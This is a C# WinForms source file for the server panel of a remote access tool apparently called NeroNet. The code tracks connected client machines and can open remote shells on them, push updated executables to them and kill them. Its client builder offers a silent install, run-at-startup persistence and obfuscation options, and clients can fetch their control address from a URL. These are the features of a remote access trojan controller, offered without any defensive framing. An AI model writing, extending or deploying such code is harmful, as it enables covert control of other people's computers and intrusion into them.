using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static NeroNet.Classes.Server;
using Message = Telepathy.Message;
using NeroNet.Classes;
using Telepathy;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Net;

namespace NeroNet
{
    public partial class Main : Form
    {
        public Main()
        {
            InitializeComponent();
        }

        private int CurrentSelectedID;
        private RemoteShell RS = new RemoteShell();
        private Settings.Values Settings;

        private void Server_Load(object sender, EventArgs e)
        {
            txtSettingsIP.Text = Utils.GetLocalIPAddress();
            nudSettingsPort.Maximum = 65353;
            nudSettingsPort.Value = 1337;
        }

        public static string GetSubstringByString(string a, string b, string c)
        {
            try
            {
                return c.Substring(c.IndexOf(a) + a.Length, c.IndexOf(b) - c.IndexOf(a) - a.Length);
            }
            catch { }

            return "";
        }

        public void WriteToOutput(string content)
        {
            OutPutLog.AppendText(content + "\n");
            OutPutLog.Select(OutPutLog.Text.Length, 0);
            OutPutLog.ScrollToCaret();
        }

        private void GetDataLoop_Tick(object sender, EventArgs e)
        {
            GetRecievedData();
        }

        #region Main Server Code

        #region Data Handler
        //Gets all data that has been sent to the server and handles it
        public async void GetRecievedData()
        {
            Message Data;
            while (MainServer.GetNextMessage(out Data))
                switch (Data.eventType)
                {
                    case EventType.Connected:
                        string ClientAddress = MainServer.GetClientAddress(Data.connectionId);

                        lbConnectedClients.Items.Add(new ListViewItem(new[]
                        {
                            Data.connectionId.ToString(), ClientAddress, "N/A", "N/A",
                            "N/A"
                        }));
                        WriteToOutput(ClientAddress + " Connected and recieved ID " + Data.connectionId.ToString() + "!");
                        MainServer.Send(Data.connectionId, Encoding.ASCII.GetBytes("StopUsageStream"));
                        break;

                    case EventType.Disconnected:
                        for (int n = lbConnectedClients.Items.Count - 1; n >= 0; --n)
                        {
                            ListViewItem LVI = lbConnectedClients.Items[n];
                            if (LVI.SubItems[0].Text.Contains(Data.connectionId.ToString()))
                                lbConnectedClients.Items.Remove(LVI);
                        }
                        WriteToOutput("ID " + Data.connectionId.ToString() + " disconnected!");
                        break;

                    case EventType.Data:
                        HandleData(Data.connectionId, Data.data);
                        break;
                }
        }

        //Handles data by switching between byte headers
        public void HandleData(int ConnectionId, byte[] RawData)
        {
            byte[] ToProcess = RawData.Skip(1).ToArray();
            //Process type of data
            switch (RawData[0])
            {
                case 10: //Hardware Usage Type
                    UpdateHardwareUsage(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    WriteToOutput("ID " + ConnectionId + ": " + Encoding.ASCII.GetString(ToProcess));
                    break;

                case 18: //Remote Shell Type
                    UpdateRemoteShell(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    WriteToOutput("ID " + ConnectionId + ": " + Encoding.ASCII.GetString(ToProcess));
                    break;
            }
        }

        #endregion Data Handler

        #region Update Functions

        //Update remote shell with output
        public void UpdateRemoteShell(int ConnectionId, string Output)
        {
            foreach (RemoteShell RS in Application.OpenForms.OfType<RemoteShell>())
                if (RS.Visible && RS.ConnectionID == ConnectionId && RS.Update)
                {
                    if (string.IsNullOrWhiteSpace(RS.txtConsole.Text))
                        RS.txtConsole.Text = Output;
                    else
                        RS.txtConsole.AppendText(Environment.NewLine + Output);
                    return;
                }

            RS = new RemoteShell();
            RS.ConnectionID = ConnectionId;
            RS.Text = "Remote Shell - " + ConnectionId;
            RS.Show();
            if (RS.ConnectionID == ConnectionId)
            {
                if (string.IsNullOrWhiteSpace(RS.txtConsole.Text))
                    RS.txtConsole.Text = Output;
                else
                    RS.txtConsole.AppendText(Environment.NewLine + Output);
            }
        }


        #endregion Update Functions

        #endregion Main Server Code

        private void btnStartServer_Click(object sender, EventArgs e)
        {
            try
            {
                if (txtSettingsIP.Enabled)
                {
                    int Port = Convert.ToInt32(nudSettingsPort.Value);
                    MainServer.Start(Port);
                    lblStatus.ForeColor = Color.Green;
                    lblStatus.Text = $"Online";
                    GetDataLoop.Start();
                }
                else
                {
                    using (WebClient wc = new WebClient())
                    {
                        MainServer.Start(Convert.ToInt32(wc.DownloadString(txtSettingsURL.Text).Split(':')[1]));
                        lblStatus.ForeColor = Color.Green;
                        lblStatus.Text = $"Online";
                        GetDataLoop.Start();
                    }
                }
            }
            catch (Exception EX)
            {
                MessageBox.Show("Error: " + EX.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void btnStopServer_Click(object sender, EventArgs e)
        {
            lbConnectedClients.Items.Clear();
            MainServer.Stop();
            GetDataLoop.Stop();
            lblStatus.ForeColor = Color.Red;
            lblStatus.Text = $"Offline";
        }

        private void btnRemote_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("StartRS"));
        }

        private void lbConnectedClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                ListViewItem LVI = lbConnectedClients.SelectedItems[0];
                CurrentSelectedID = Convert.ToInt16(LVI.SubItems[0].Text);
                int ConnectionId = CurrentSelectedID;

                for (int i = 0; i < lbConnectedClients.Items.Count + 1; i++)
                {
                    MainServer.Send(i, Encoding.ASCII.GetBytes("StopUsageStream"));
                }

                MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("StartUsageStream"));
            }
            catch
            {
                for (int i = 0; i < lbConnectedClients.Items.Count + 1; i++)
                {
                    MainServer.Send(i, Encoding.ASCII.GetBytes("StopUsageStream"));
                }
            }
        }

        private void btnBuildClient_Click(object sender, EventArgs e)
        {
            Builder ClientBuilder = new Builder();
            try
            {
                Convert.ToInt16(nudSettingsPort.Value);
            }
            catch (Exception EX)
            {
                MessageBox.Show("Error: " + EX.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string Install = cbRemoveInstallPrompt.Checked ? "True" : "False";
            string Startup = cbRunAtStartup.Checked ? "True" : "False";
            bool Obfuscation = false;
            bool ObfRenaming = false;
            int ObfRenamingIndex = 0;
            bool ObfFakeAttributes = false;

            if (txtSettingsIP.Enabled)
                ClientBuilder.BuildClient(nudSettingsPort.Value.ToString(), txtSettingsIP.Text, "NeroNet", "NeroNet", "1", Install, Startup, Obfuscation, ObfRenaming, ObfRenamingIndex, ObfFakeAttributes);
            else
                ClientBuilder.BuildClient("1", txtSettingsURL.Text, "NeroNet", "NeroNet", "1", Install, Startup, Obfuscation, ObfRenaming, ObfRenamingIndex, ObfFakeAttributes);


            Process.Start("explorer.exe", Environment.CurrentDirectory + @"\Clients\");
        }

        private void btnKill_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("KillClient"));
        }

        private void btnDisconnect_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("DisconnectClient"));
        }

        private void btnUpdate_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            OpenFileDialog OFD = new OpenFileDialog();
            OFD.Multiselect = false;
            OFD.InitialDirectory = Environment.CurrentDirectory + @"\Clients\";
            if (OFD.ShowDialog() == DialogResult.OK)
            {
                if (!TempDataHelper.CanUpload)
                {
                    MessageBox.Show("Error: Can not upload multiple files at once.", "Error", MessageBoxButtons.OK,
                        MessageBoxIcon.Error);
                }
                else
                {
                    TempDataHelper.CanUpload = false;
                    string FileString = OFD.FileName;
                    byte[] FileBytes;
                    using (FileStream FS = new FileStream(FileString, FileMode.Open))
                    {
                        FileBytes = new byte[FS.Length];
                        FS.Read(FileBytes, 0, FileBytes.Length);
                    }

                    AutoClosingMessageBox.Show("Starting client update.", "Starting Upload", 1000);
                    MainServer.Send(ConnectionId,
                        Encoding.ASCII.GetBytes("StartFileReceive{[UPDATE]" + Path.GetFileName(OFD.FileName) + "}"));
                    Thread.Sleep(80);
                    MainServer.Send(ConnectionId, FileBytes);
                    TempDataHelper.CanUpload = true;
                }
            }
        }

        public void UpdateHardwareUsage(int ConnectionId, string UsageData)
        {
            if (CurrentSelectedID == ConnectionId)
            {
                double CPUUsageRaw = Convert.ToDouble(GetSubstringByString("{", "}", UsageData));
                string CPUUsageString = Convert.ToInt32(CPUUsageRaw).ToString();
                string RamAmount = GetSubstringByString("[", "]", UsageData);
                double DiskUsageRaw = Convert.ToDouble(GetSubstringByString("<", ">", UsageData));
                string DiskUsageString = Convert.ToInt32(DiskUsageRaw).ToString();
                lblClientRAM.Text = $"RAM: {RamAmount} Bytes";
                lblClientCPU.Text = $"CPU: {CPUUsageString}%";
                lblClientDISK.Text = $"DISK: {DiskUsageString}%";
                lblClientGPU.Text = $"GPU: 0%";
                return;
            }
        }

        private void txtSettingsURL_TextChanged(object sender, EventArgs e)
        {
            if (txtSettingsURL.Text != "")
            {
                txtSettingsIP.Enabled = false;
                nudSettingsPort.Enabled = false;
            }
            else
            {
                txtSettingsIP.Enabled = true;
                nudSettingsPort.Enabled = true;
            }
        }

        private void txtSettingsIP_TextChanged(object sender, EventArgs e)
        {
            if (txtSettingsIP.Text != "")
            {
                txtSettingsURL.Enabled = false;
            }
            else
            {
                txtSettingsURL.Enabled = true;
            }
        }
    }
}